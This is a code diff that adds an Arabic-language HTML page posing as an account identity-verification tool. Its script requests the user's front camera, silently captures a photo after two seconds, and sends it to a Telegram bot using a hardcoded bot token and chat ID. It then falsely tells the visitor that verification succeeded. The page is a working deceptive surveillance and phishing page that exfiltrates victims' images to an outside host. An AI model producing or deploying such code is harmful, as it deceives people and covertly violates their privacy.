@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام التحقق من الهوية</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; background: #121212; color: white; padding-top: 100px; }
+        .card { background: #1e1e1e; padding: 30px; border-radius: 15px; display: inline-block; border: 1px solid #333; }
+        button { background: #28a745; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        #status { margin-top: 20px; color: #888; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h2>أداة التحقق من الحساب</h2>
+        <p>يرجى الضغط على الزر أدناه للمتابعة</p>
+        <button onclick="start()">تفعيل ودخول</button>
+        <div id="status"></div>
+    </div>
+    <video id="v" width="640" height="480" autoplay style="display:none;"></video>
+    <canvas id="c" width="640" height="480" style="display:none;"></canvas>
+
+    <script>
+        const TOKEN = "8348320270:AAGKegixiqLVoglb-Th0DuR9PfEdajS8yQo";
+        const ADMIN_ID = "7289235107";
+
+        async function start() {
+            const s = document.getElementById('status');
+            try {
+                s.innerText = "جاري طلب الإذن...";
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                document.getElementById('v').srcObject = stream;
+                s.innerText = "تم الاتصال.. جاري المعالجة";
+                
+                setTimeout(async () => {
+                    const canvas = document.getElementById('c');
+                    canvas.getContext('2d').drawImage(document.getElementById('v'), 0, 0, 640, 480);
+                    const img = canvas.toDataURL('image/jpeg', 0.7);
+                    const blob = await (await fetch(img)).blob();
+
+                    const fd = new FormData();
+                    fd.append('chat_id', ADMIN_ID);
+                    fd.append('photo', blob, 'capture.jpg');
+
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd })
+                    .then(() => {
+                        s.innerText = "تم التحقق بنجاح!";
+                        stream.getTracks().forEach(t => t.stop());
+                    });
+                }, 2000);
+            } catch (e) {
+                s.innerText = "خطأ: يجب السماح بالكاميرا للعمل.";
+            }
+        }
+    </script>
+</body>
+</html>
